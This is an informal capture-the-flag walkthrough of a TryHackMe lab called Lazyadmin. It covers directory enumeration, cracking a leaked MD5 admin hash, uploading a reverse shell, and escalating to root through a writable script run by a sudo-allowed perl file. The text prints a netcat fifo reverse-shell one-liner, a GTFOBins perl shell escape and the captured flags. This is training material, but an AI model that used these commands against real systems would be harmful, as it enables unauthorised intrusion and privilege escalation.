lets first use gobuster 

 gobuster dir -u http://10.10.245.115 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt     
 
 we found this  http://10.10.245.115/content/

lets gobust also on the same uurl 

using nmap we see that the host has 2 important ports 

///////////////////////////


─(Abad㉿kali)-[~/Desktop/work/tryhackme/Lazyadmin]
└─$ nmap -p21 10.10.245.115
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-15 02:34 GMT
Nmap scan report for 10.10.245.115
Host is up (0.34s latency).

PORT   STATE  SERVICE
21/tcp closed ftp

Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
                                                                                
┌──(Abad㉿kali)-[~/Desktop/work/tryhackme/Lazyadmin]
└─$ nmap -p22 10.10.245.115
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-15 02:34 GMT
Nmap scan report for 10.10.245.115
Host is up (0.55s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.90 seconds
                                                                                
┌──(Abad㉿kali)-[~/Desktop/work/tryhackme/Lazyadmin]
└─$ 



/////////////////////////

testing the url we found another associated urls 

t.Timeout exceeded while awaiting headers)
/inc                  (Status: 301) [Size: 320] [--> http://10.10.245.115/content/inc/]
/as                   (Status: 301) [Size: 319] [--> http://10.10.245.115/content/as/]
/_themes              (Status: 301) [Size: 324] [--> http://10.10.245.115/content/_themes/]
Progress: 3729 / 220560 (1.69%)[ERROR] Get "htt


this link has some crucial files like db.php lets use wget on it 

http://10.10.245.115/content/inc/

remember to shut any processus during hard tasks 


using sudo with wget we got the db.php 

///////////////

sudo wget http://10.10.245.115/content/inc/db.php
--2025-03-15 02:44:40--  http://10.10.245.115/content/inc/db.php
Connecting to 10.10.245.115:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/html]
Saving to: ‘db.php’

db.php                  [ <=>                ]       0  --.-KB/s    in 0s      

2025-03-15 02:44:40 (0.00 B/s) - ‘db.php’ saved [0/0]




/////////////////////

nothing found in this so lets try another thing 


we found something here 

http://10.10.245.115/content/inc/mysql_backup/

a db 

from the database found in the previous url we found 

///////////////////////




From the given PHP code, the critical information found includes:

    Admin Username:
        admin is set to "manager" in the global_setting option.

    Password Hash:
        The password is stored as a hashed value: 42f749ade7f9e195bf475f37a44cafcb.
        This is a hashed value using MD5, so the plaintext password can potentially be obtained by reversing the MD5 hash.

    Site Details:
        Website name: "Lazy Admin's Website".
        Author: "Lazy Admin".
        Site Description: "Description".
        Site Keywords: "Keywords".

    Other Information:
        Some general settings related to the website, including whether the site is closed or not, caching settings, user tracking, URL rewriting, theme, and language settings.




/////////////////////////////


we found that this admin {manager} has this hashed password {42f749ade7f9e195bf475f37a44cafcb}


using john we found a password for this hash 

///////////////


  john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)     
1g 0:00:00:00 DONE (2025-03-15 03:14) 50.00g/s 1689Kp/s 1689Kc/s 1689KC/s 062488..renita
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

       
       
       NB = be carefull hash modification in the file even one point , the cracking will not work 
       
       
       we can use also a website called crack station 
     
     the credentials now 
manager : Password123

lets use it in the login in {http://10.10.245.115/content/as/}


lets run the website 
     
     now we can try to upload a reverse shell 
     from http://10.10.245.115/content/as/?type=ad and then trigerring it from here  http://10.10.245.115/content/inc/ads/ 
     
     
     now we got a reverse shell  nc -lnvp 9999             
Listening on 0.0.0.0 9999
Connection received on 10.10.245.115 42096
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 05:37:11 up  1:09,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 



lets stabilise it 

///////////////

first we run :  python -c 'import pty; pty.spawn("/bin/bash")'


second : we run : export TERM=xterm 

then we follow this with ctrl+z 

then we run this : stty raw -echo; fg

////////////////////////////


lets find the first flag 

find / -name user.txt 2>/dev/null


we found it 

//////////


bash: cd: HOME not set
www-data@THM-Chal:/home/itguy$ find / -name user.txt 2>/dev/null
/home/itguy/user.txt
www-data@THM-Chal:/home/itguy$ 
www-data@THM-Chal:/home/itguy$ cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
www-data@THM-Chal:/home/itguy$ 



///////////



now with the priviliges we have lets try to escalate them 

HM{63e5bce9271952aad1113b6f1ac28a07}
www-data@THM-Chal:/home/itguy$ find / -name root.txt 2>/dev/null
www-data@THM-Chal:/home/itguy$ sudo -l 
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$ 



This means that the user www-data (a low-privileged web server user) can execute the script /home/itguy/backup.pl as root (without a password).
     
     
     
     
   now lets see what we can do with the sudo perl using gtfobins 
   https://gtfobins.github.io/#perl
       
       Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

    sudo perl -e 'exec "/bin/sh";'

Since i can execute /home/itguy/backup.pl with sudo, and with the script on perl when i have sudo , the script from gtfobins will help me gain priviligess 

lets try /home/itguy/backup.pl sudo perl -e 'exec "/bin/sh";'




                                                         


/////////////////////


okay using another approach lets cat whats in backup.pl 

   (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/$ cat  /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
www-data@THM-Chal:/$ 

lets cat the script :  cat /etc/copy.sh 

this is whats inside : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f



i have sudo privileges to execute /usr/bin/perl /home/itguy/backup.pl without a password, and backup.pl executes /etc/copy.sh, which contains a reverse shell command using Netcat (nc).



///// 

since i have acces to the file /etc/copy.sh  as a root 
lets override the contains of the file and make it create a shell for us as a root 

using echo "to replace with this " > "in this file ", echo "to append with this" >> ""in this file ""


NB: any changes of the cmnd or usage of sudo may make it exige permision that u dont have so stay alert 


now lets execute the file

with the priviliges we have 

/usr/bin/perl /home/itguy/backup.pl

now we became root 

///////////

   (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
root@THM-Chal:/# 


/////////

lets find the file  root.txt

remember allways use sudo to the privilige that u have to activate it 

sudo /usr/bin/perl /home/itguy/backup.pl








root@THM-Chal:/# find / -name root.txt 2>/dev/null

/root/root.txt
root@THM-Chal:/# 
root@THM-Chal:/# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
root@THM-Chal:/# 











